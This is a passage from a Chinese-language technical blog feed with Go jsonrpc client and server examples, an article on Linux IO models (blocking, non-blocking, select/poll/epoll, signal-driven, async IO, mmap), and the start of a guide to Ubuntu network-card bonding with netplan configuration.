class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="jsonrpc"><a href="#jsonrpc" class="headerlink" title="jsonrpc"></a>jsonrpc</h4><p>client</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"net/rpc/jsonrpc"</span></span><br><span class="line"><span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> JsonRpcRequest <span class="keyword">struct</span> &#123;</span><br><span class="line">Left, Right <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> JsonRpcResponse <span class="keyword">struct</span> &#123;</span><br><span class="line">Result <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// jsonrpc连接</span></span><br><span class="line">client, _ := jsonrpc.Dial(<span class="string">"tcp"</span>, <span class="string">":8888"</span>)</span><br><span class="line"></span><br><span class="line">req := JsonRpcRequest&#123;<span class="number">100</span>, <span class="number">2</span>&#125;</span><br><span class="line">resp := JsonRpcResponse&#123;&#125;</span><br><span class="line"><span class="comment">// client.Call("JsonCalc.Add", req, &amp;resp)</span></span><br><span class="line"><span class="comment">// 通过别名调用</span></span><br><span class="line"><span class="comment">// client.Call("jsonrpcadd.Add", req, &amp;resp)</span></span><br><span class="line"><span class="comment">// fmt.Println(resp)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// rpc异步调用</span></span><br><span class="line">call := client.Go(<span class="string">"jsonrpcadd.Add"</span>, req, resp, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> result := &lt;-call.Done:</span><br><span class="line">fmt.Println(result.Reply, result.Error)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">fmt.Println(time.Now())</span><br><span class="line">time.Sleep(<span class="number">2</span> * time.Second)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>server</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"net"</span></span><br><span class="line"><span class="string">"net/rpc"</span></span><br><span class="line"><span class="string">"net/rpc/jsonrpc"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> JsonRpcRequest <span class="keyword">struct</span> &#123;</span><br><span class="line">Left, Right <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> JsonRpcResponse <span class="keyword">struct</span> &#123;</span><br><span class="line">Result <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> JsonCalc <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(j *JsonCalc)</span> <span class="title">Add</span><span class="params">(req JsonRpcRequest, resp *JsonRpcResponse)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">resp.Result = req.Left + req.Right</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(j *JsonCalc)</span> <span class="title">Sub</span><span class="params">(req JsonRpcRequest, resp *JsonRpcResponse)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">resp.Result = req.Left - req.Right</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 注册</span></span><br><span class="line"><span class="comment">// rpc.Register(&amp;JsonCalc&#123;&#125;)</span></span><br><span class="line"><span class="comment">// 别名注册</span></span><br><span class="line">rpc.RegisterName(<span class="string">"jsonrpcadd"</span>, &amp;JsonCalc&#123;&#125;)</span><br><span class="line">listener, _ := net.Listen(<span class="string">"tcp"</span>, <span class="string">":8888"</span>)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">conn, err := listener.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// 启动例程处理连接</span></span><br><span class="line"><span class="keyword">go</span> jsonrpc.ServeConn(conn)</span><br><span class="line">&#125;</span><br><span class="line">listener.Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;主要记录学习遇到的库，以及基本用法，后续会不断更新与完善，以便查阅。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Go" scheme="http://yoursite.com/categories/Go/"/>
    
    
      <category term="strings" scheme="http://yoursite.com/tags/strings/"/>
    
      <category term="strconv" scheme="http://yoursite.com/tags/strconv/"/>
    
      <category term="flag" scheme="http://yoursite.com/tags/flag/"/>
    
      <category term="time" scheme="http://yoursite.com/tags/time/"/>
    
      <category term="bufio" scheme="http://yoursite.com/tags/bufio/"/>
    
      <category term="filepath" scheme="http://yoursite.com/tags/filepath/"/>
    
  </entry>
  
  <entry>
    <title>常见IO模型分析</title>
    <link href="http://yoursite.com/2020/10/17/%E5%B8%B8%E8%A7%81IO%E6%A8%A1%E5%9E%8B%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/10/17/%E5%B8%B8%E8%A7%81IO%E6%A8%A1%E5%9E%8B%E5%88%86%E6%9E%90/</id>
    <published>2020-10-17T09:27:38.000Z</published>
    <updated>2020-10-17T09:41:49.591Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一次完整的I/O是用户空间的进程数据与内核空间的内核数据的报完交换过程，但是由于内核空间和用户进程空间的隔离，导致数据户交换需要经历一次从内核空间的内存拷贝到用户空间的过程，而</p><p>到了网络通信就是从内核的网络协议栈将数据拷贝到用户进程空间的过程。</p><a id="more"></a><p><img src="/2020/10/17/%E5%B8%B8%E8%A7%81IO%E6%A8%A1%E5%9E%8B%E5%88%86%E6%9E%90/%E7%BD%91%E7%BB%9C%E8%AE%BF%E9%97%AE%E6%B5%81%E7%A8%8B.png" alt="网络访问流程"></p><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>首先需要理清楚概念，即阻塞与非组设、同步与异步这两套概念，这两套概念是站在不同角度考虑整个请求过程。</p><p>同步和异步关注的是消息通信机制。</p><p>同步可以理解为：调用者发出一个请求，会等待被调用者的反馈。</p><p>异步则是：调用者发出一个请求，不等待返回结果而直接返回。被调用者在处理完后（或者处理失败都认为处理结束）反馈给调用者（回调函数机制）。</p><p>阻塞与非阻塞描述的是进程等待调用结果的状态。</p><p>阻塞表示调用结果返回前该进程会一直等待（挂起），该状态下不会处理其他请求。</p><p>非阻塞表示调用者在发出调用请求后不理会是否有结果返回，而是正常处理其它事务。</p><h3 id="IO模型"><a href="#IO模型" class="headerlink" title="IO模型"></a>IO模型</h3><p>IO耗时主要体现在两个方面，一是用户空间进程等待监听的套接字数据，二是用户进程处理数据。</p><p><img src="/2020/10/17/%E5%B8%B8%E8%A7%81IO%E6%A8%A1%E5%9E%8B%E5%88%86%E6%9E%90/io-model.png" alt="io-model"></p><h4 id="阻塞"><a href="#阻塞" class="headerlink" title="阻塞"></a>阻塞</h4><p>用户请求到达系统服务进程，然后进程通过系统调用read向内核发起IO读操作，即将用户请求由用户空间转到内核空间，内核接收到IO请求后开始从磁盘读取文件到内核内存，即在等用户请求的文件从磁盘到达内核内存后，然后将接收的数据拷贝到用户空间，然后完成read操作。</p><p>用户请求需要等待内核将数据读取到进程内存后，处理用户的进程才可以继续处理该请求，整个IO请求的过程中，请求进程是被阻塞的，这导致进程在发起IO请求时，不能做任何事情，此时进程不占用CPU资源。此外，进程会一直轮询查看IO是否完成，完成后才会返回结果解除阻塞状态，因此这种方式较为低效。</p><p><img src="/2020/10/17/%E5%B8%B8%E8%A7%81IO%E6%A8%A1%E5%9E%8B%E5%88%86%E6%9E%90/blocking-io.png" alt="blocking-io"></p><h4 id="非阻塞"><a href="#非阻塞" class="headerlink" title="非阻塞"></a>非阻塞</h4><p>用户请求进程向内核发起IO请求时立即返回，但并未读取到任何数据，进程需要不断地发起IO请求，直到数据到达进程空间的内存后才真正读取到数据并继续执行，即前期需要一次次“轮询”去查看请求是否数据是否准备好。</p><p>调用recvfrom接口，无论内核缓冲区是否有可用数据，进程都会立即返回，所以在<em>IO</em>操作的第一阶段是非阻塞的; 若无数据可用，内核将errno设置为为EWOULDBLOCK或者EAGAIN，进程可以使用轮询的方法，保证内核在数据准备好时，能立即拷贝到用户空间; 若有则立即将数据拷贝到用户空间，进程在数据拷贝到用户空间即<em>IO</em>操作的第二阶段是阻塞的;</p><p>但是此机制存在两个问题：</p><p>1、如果有大量文件描述符都要等，那么就得一个一个的read，这会带来大量的Context Switch（read是系统调用，每调用一次就得在用户态和核心态切换一次）。</p><p>2、轮询的时间不好把握，这里是要猜多久之后数据才能到，等待时间设的太长，程序响应延迟就过大，但是设的太短就会造成过于频繁的重试，会大量消耗CPU时间，因此一般很少直接使用这种模型，而是在其他IO模型中使用非阻塞IO这一 特性。</p><p><img src="/2020/10/17/%E5%B8%B8%E8%A7%81IO%E6%A8%A1%E5%9E%8B%E5%88%86%E6%9E%90/no-blocking-io.png" alt="no-blocking-io"></p><h4 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h4><p>IO 多路复用就是我们说的select，poll，epoll机制，有些地方也称这种IO方式为event driven IO(事件驱动IO)。select/poll/epoll的好处就在于单个process就可以同时处理多个网络连接的IO。它的基本原理就是select，poll， epoll这个function会不断的轮询所负责的所有socket，当某个socket有数据到达了就通知用户进程。当用户进程调用了select，那么整个进程会被block，而同时kernel会“监视”所有select负责的socket，当任何一个socket中的数据准备好了，select就会返回，这个时候用户进程再调用read操作，将数据从kernel拷贝到用户进程。</p><p>调用select，等待内核数据准备，所以IO操作的第一个阶段，进程是阻塞的，不过是阻塞在多路复用系统调用上，而不是IO系统调用上; 当select返回套接字可读条件时，再调用recvfrom将数据从内核拷贝到用户空间，IO操作的第二阶段，进程是阻塞的</p><p>多路复用<em>IO</em>和阻塞IO，在IO操作的两个阶段都是阻塞的，不过多路复用IO使用了两个系统调用，而阻塞IO只使用了一个，所以在连接数不是很多的情况下，阻塞IO可能性能更佳; 多路复用IO的优势在于可以同时监控多个用于IO的文件描述符。</p><table><thead><tr><th>\</th><th>select</th><th>poll</th><th>epoll</th></tr></thead><tbody><tr><td>操作方式</td><td>遍历</td><td>遍历</td><td>回调</td></tr><tr><td>底层实现</td><td>数组</td><td>链表</td><td>hashmap</td></tr><tr><td>IO效率</td><td>线性遍历O(n)</td><td>线性遍历O(n)</td><td>回调函数O(1)</td></tr><tr><td>最大连接数</td><td>1024/2048</td><td>无上限</td><td>无上限</td></tr><tr><td>fd拷贝</td><td>每次调用都要拷贝所有fd到内核态</td><td>每次调用都要拷贝所有fd到内核态</td><td>调用epoll_ctl拷贝并保存，之后调用epoll_wait等待不拷贝</td></tr></tbody></table><p><img src="/2020/10/17/%E5%B8%B8%E8%A7%81IO%E6%A8%A1%E5%9E%8B%E5%88%86%E6%9E%90/multi-io.png" alt="multi-io"></p><h4 id="信号驱动"><a href="#信号驱动" class="headerlink" title="信号驱动"></a>信号驱动</h4><p>调用sigaction等系统调用安装信号处理函数，并立即返回，所以IO操作的第一阶段，进程是非阻塞的; 当内核数据准备好时，内核会产生一个信号，通知进程将数据从内核拷贝到用户空间，IO操作的第二阶段，进程是阻塞的</p><p><img src="/2020/10/17/%E5%B8%B8%E8%A7%81IO%E6%A8%A1%E5%9E%8B%E5%88%86%E6%9E%90/signal-io.png" alt="signal-io"></p><h4 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h4><p>相对于同步IO，异步IO不是顺序执行，用户进程进行aio_read系统调用之后（给内核传递描述字、缓冲区指针、缓冲区大小、文件偏移），告诉内核整个操作结束后通知进程，因此无论内核数据是否准备好，都会直接返回给用户进程，然后用户态进程可以去做别的事情，等到socket数据准备好了，内核直接复制数据给进程，然后从内核向进程发送通知，在IO的两个阶段进程都是非阻塞的。Linux提供了AIO库函数实现异步，但是用的很少，目前有很多开源的异步IO库，例如libevent、libev、libuv等，异步过程如下图所示</p><p><img src="/2020/10/17/%E5%B8%B8%E8%A7%81IO%E6%A8%A1%E5%9E%8B%E5%88%86%E6%9E%90/asyn-io.png" alt="asyn-io"></p><h3 id="通知模型"><a href="#通知模型" class="headerlink" title="通知模型"></a>通知模型</h3><p>水平触发：多次通知，需要关心数据是否取完，即数据取走之后即不再通知进程，以避免重复多次无效通知，通知效率较低。<br>边缘触发：一次通知，需要关心数据是否取走，即只通知一次怎么保证数据被进程成功取走了，以避免数据丢失， 通知效率较高</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Select：</span><br><span class="line">POSIX所规定，目前几乎在所有的平台上支持，其良好跨平台支持也是它的一个优点，本质上是通过设置或者检查存放fd标志位的数据结构来进行下一步处理</span><br><span class="line">缺点</span><br><span class="line">单个进程能够监视的文件描述符的数量存在最大限制，在Linux上一般为1024，可以通过修改宏定义FD_SETSIZE，再重新编译内核实现，但是这样也会造成效率的降低。</span><br><span class="line">单个进程可监视的fd数量被限制，默认是1024，修改此值需要重新编译内核。对socket是线性扫描，即采用轮询的方法，效率较低。</span><br><span class="line">select  采取了内存拷贝方法来实现内核将  FD  消息通知给用户空间，这样一个用来存放大量fd的数据结构，这样会使得用户空间和内核空间在传递该结构时复制开销大。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">poll：</span><br><span class="line">本质上和select没有区别，它将用户传入的数组拷贝到内核空间，然后查询每个fd对应的设备状态。其没有最大连接数的限制，原因是它是基于链表来存储的。</span><br><span class="line">大量的fd的数组被整体复制于用户态和内核地址空间之间，而不管这样的复制是不是有意义。</span><br><span class="line">poll特点是“水平触发”，如果报告了fd后，没有被处理，那么下次poll时会再次报告该fd。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">epoll：</span><br><span class="line">在Linux  2.6内核中提出的select和poll的增强版本。</span><br><span class="line">支持水平触发LT和边缘触发ET，最大的特点在于边缘触发，它只告诉进程哪些fd刚刚变为就需态，并且只会通知一次</span><br><span class="line">使用“事件”的就绪通知方式，通过epoll_ctl注册fd，一旦该fd就绪，内核就会采用类似callback的回调机制来激活该fd，epoll_wait便可以收到通知  。</span><br><span class="line">优点:</span><br><span class="line">没有最大并发连接的限制：能打开的FD的上限远大于1024(1G的内存能监听约10万个端口)，具体查看&#x2F;proc&#x2F;sys&#x2F;fs&#x2F;file-max，此值和系统内存大小相关</span><br><span class="line">效率提升：非轮询的方式，不会随着FD数目的增加而效率下降；只有活跃可用的FD才会调用callback函数，即</span><br><span class="line">epoll最大的优点就在于它只管理“活跃”的连接，而跟连接总数无关</span><br><span class="line">内存拷贝，利用mmap(Memory  Mapping)加速与内核空间的消息传递；即epoll使用mmap减少复制开销</span><br></pre></td></tr></table></figure><h3 id="MMAP"><a href="#MMAP" class="headerlink" title="MMAP"></a>MMAP</h3><p>mmap(memory mapping)系统调用使得进程之间通过映射同一个普通文件实现共享内存，普通文件被映射到进程地址空间后，进程可以像访问普通内存一样对文件进行访问。</p><p>传统数据传递方式</p><p><img src="/2020/10/17/%E5%B8%B8%E8%A7%81IO%E6%A8%A1%E5%9E%8B%E5%88%86%E6%9E%90/mmap-old.png" alt="mmap-old"></p><p>mmap方式</p><p><img src="/2020/10/17/%E5%B8%B8%E8%A7%81IO%E6%A8%A1%E5%9E%8B%E5%88%86%E6%9E%90/mmap.png" alt="mmap"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这五种网络 I/O 模型中，越往后阻塞越少，理论上效率也是最优前四种属于同步 I/O，因为其中真正的 I/O 操作(recvfrom)将阻塞进程，只有异步 I/O 模型才与 POSIX 定义的异步 I/O 相匹配。</p><p><img src="/2020/10/17/%E5%B8%B8%E8%A7%81IO%E6%A8%A1%E5%9E%8B%E5%88%86%E6%9E%90/C:%5CUsers%5CFrdqy%5CDesktop%5Ccompare-io.png" alt="compare-io"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;一次完整的I/O是用户空间的进程数据与内核空间的内核数据的报完交换过程，但是由于内核空间和用户进程空间的隔离，导致数据户交换需要经历一次从内核空间的内存拷贝到用户空间的过程，而&lt;/p&gt;
&lt;p&gt;到了网络通信就是从内核的网络协议栈将数据拷贝到用户进程空间的过程。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Linux,IO模型" scheme="http://yoursite.com/tags/Linux-IO%E6%A8%A1%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu 网卡bond</title>
    <link href="http://yoursite.com/2020/10/11/ubuntu-%E7%BD%91%E5%8D%A1bond/"/>
    <id>http://yoursite.com/2020/10/11/ubuntu-%E7%BD%91%E5%8D%A1bond/</id>
    <published>2020-10-11T12:59:51.000Z</published>
    <updated>2020-10-17T05:08:23.390Z</updated>
    
    <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>生产环境中一台主机会有多个网卡，有时候我们会将两个网卡进行绑定，这样当一块网卡出现故障无法工作时另一个网卡还可以正常工作，可以理解为冗余，此外bond后由于多个网卡绑定到某个IP，能够大幅度提高网络总带宽和容错能力。</p><a id="more"></a><h3 id="bond模式"><a href="#bond模式" class="headerlink" title="bond模式"></a>bond模式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">第⼀种模式：mod&#x3D;0，即：(balance-rr) Round-robin policy（平衡抡循环策略）</span><br><span class="line">特点：传输数据包顺序是依次传输（即：第1个包⾛eth0，下⼀个包就⾛eth1….⼀直循环下去，直到最后⼀个传输完</span><br><span class="line">毕），此模式提供负载平衡和容错能⼒。</span><br><span class="line">第⼆种模式：mod&#x3D;1，即： (active-backup) Active-backup policy（主-备份策略）</span><br><span class="line">特点：只有⼀个设备处于活动状态，当⼀个宕掉另⼀个⻢上由备份转换为主设备。mac地址是外部可⻅得，从外⾯看</span><br><span class="line">来，bond的MAC地址是唯⼀的，以避免switch(交换机)发⽣混乱。此模式只提供了容错能⼒；由此可⻅此算法的优点</span><br><span class="line">是可以提供⾼⽹络连接的可⽤性，但是它的资源利⽤率较低，只有⼀个接⼝处于⼯作状态，在有 N 个⽹络接⼝的情况</span><br><span class="line">下，资源利⽤率为1&#x2F;N。</span><br><span class="line">第三种模式：mod&#x3D;2，即：(balance-xor) XOR policy（平衡策略）</span><br><span class="line">特点：基于指定的传输HASH策略传输数据包。缺省的策略是：(源MAC地址 XOR ⽬标MAC地址) % slave数量。其他</span><br><span class="line">的传输策略可以通过xmit_hash_policy选项指定，此模式提供负载平衡和容错能⼒。</span><br><span class="line">第四种模式：mod&#x3D;3，即：broadcast（⼴播策略）</span><br><span class="line">特点：在每个slave接⼝上传输每个数据包，此模式提供了容错能⼒。</span><br><span class="line">第五种模式：mod&#x3D;4，即：(802.3ad) IEEE 802.3adDynamic link aggregation（IEEE 802.3ad 动态链接</span><br><span class="line">聚合）</span><br><span class="line">特点：创建⼀个聚合组，它们共享同样的速率和双⼯设定。根据802.3ad规范将多个slave⼯作在同⼀个激活的聚合体</span><br><span class="line">下。</span><br><span class="line">必要条件：</span><br><span class="line">条件1：ethtool⽀持获取每个slave的速率和双⼯设定。</span><br><span class="line">条件2：switch(交换机)⽀持IEEE 802.3ad Dynamic link aggregation。</span><br><span class="line">条件3：⼤多数switch(交换机)需要经过特定配置才能⽀持802.3ad模式。</span><br><span class="line">第六种模式：mod&#x3D;5，即：(balance-tlb) Adaptive transmit load balancing（适配器传输负载均衡）</span><br><span class="line">特点：不需要任何特别的switch(交换机)⽀持的通道bonding。在每个slave上根据当前的负载（根据速度计算）分</span><br><span class="line">配外出流量。如果正在接受数据的slave出故障了，另⼀个slave接管失败的slave的MAC地址。</span><br><span class="line">该模式的必要条件：</span><br><span class="line">ethtool⽀持获取每个slave的速率</span><br><span class="line">第七种模式：mod&#x3D;6，即：(balance-alb) Adaptive load balancing（适配器适应性负载均衡）</span><br><span class="line">特点：该模式包含了balance-tlb模式，同时加上针对IPV4流量的接收负载均衡(receive load balance,</span><br><span class="line">rlb)，⽽且不需要任何switch(交换机)的⽀持。</span><br></pre></td></tr></table></figure><h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h3><p>ubuntu 18.04开始使用netplan来管理网络（低于18.04的版本可以通过/etc/network/interfaces来修改ip配置）。在系统安装时会询问是否启动网卡聚合，这里的选项会影响/etc/netplan/50-cloud-init.yaml的配置（该配置是系统安装时创建的）</p><p>对于netplan来说，他是一个抽象的网络配置生成器，他将不同网络工具的差异性屏蔽，即只需要配置yaml文件即可。</p><p>目前支持两种工具：networkManager和systemd-networkd。前者会自动管理所有网络设备，即只要检测到以太网设备就以DHCP模式启动该设备。后者相反，每个需要启动的谁被都需要在/etc/netplan下配置，具体配置如下所示：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># This file is generated from information provided by</span></span><br><span class="line"><span class="comment"># the datasource. Changes to it will not persist across an instance.</span></span><br><span class="line"><span class="comment"># To disablecloud-init's network configuration capabilities, write a file</span></span><br><span class="line"><span class="comment"># /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following:</span></span><br><span class="line"><span class="comment"># network: &#123;config: disabled&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 网卡配置</span></span><br><span class="line"><span class="attr">network:</span></span><br><span class="line"><span class="attr">version:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">renderer:</span> <span class="string">networkd</span></span><br><span class="line"><span class="attr">ethernets:</span></span><br><span class="line"><span class="attr">enp3s0f0:</span></span><br><span class="line"><span class="attr">addresses:</span> <span class="string">[]</span><span class="comment"># 以DHCP自动获取</span></span><br><span class="line"><span class="attr">dhcp4:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">dhcp6:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">enp3s0f1:</span></span><br><span class="line"><span class="attr">addresses:</span> <span class="string">[10.129.104.1/24]</span> <span class="comment"># 固定ip </span></span><br><span class="line"><span class="attr">gateway4:</span> <span class="number">10.129</span><span class="number">.104</span><span class="number">.1</span><span class="comment"># 网关</span></span><br><span class="line"><span class="attr">nameservers:</span> <span class="string">[8.8.8.8]</span><span class="comment"># dns服务器</span></span><br><span class="line"><span class="attr">dhcp4:</span> <span class="literal">no</span></span><br></pre></td></tr></table></figure><h4 id="netplan命令"><a href="#netplan命令" class="headerlink" title="netplan命令"></a>netplan命令</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 以/etc/netplan配置为管理工具生成配置</span></span><br><span class="line"><span class="string">netplan</span> <span class="string">generate</span></span><br><span class="line"><span class="comment"># 应用配置生效</span></span><br><span class="line"><span class="string">netplan</span> <span class="string">apply</span></span><br></pre></td></tr></table></figure><h4 id="双网卡绑定"><a href="#双网卡绑定" class="headerlink" title="双网卡绑定"></a>双网卡绑定</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/netplan/01-netcfg.yaml</span></span><br><span class="line"><span class="comment"># This file describes the network interfaces available on your system</span></span><br><span class="line"><span class="comment"># For more information, see netplan(5).</span></span><br><span class="line"><span class="attr">network:</span></span><br><span class="line"><span class="attr">version:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">renderer:</span> <span class="string">networkd</span></span><br><span class="line"><span class="attr">ethernets:</span></span><br><span class="line"><span class="attr">eth0:</span></span><br><span class="line"><span class="attr">dhcp4:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">dhcp6:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">eth1:</span></span><br><span class="line"><span class="attr">dhcp4:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">dhcp6:</span> <span class="literal">no</span></span><br><span class="line"></span><br><span class="line"><span class="attr">bonds:</span></span><br><span class="line"><span class="attr">bond0:</span></span><br><span class="line"><span class="attr">interfaces:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">eth0</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">eth1</span></span><br><span class="line"><span class="attr">addresses:</span> <span class="string">[172.18.3.18/16]</span></span><br><span class="line"><span class="attr">gateway4:</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">nameservers:</span></span><br><span class="line"><span class="attr">addresses:</span> <span 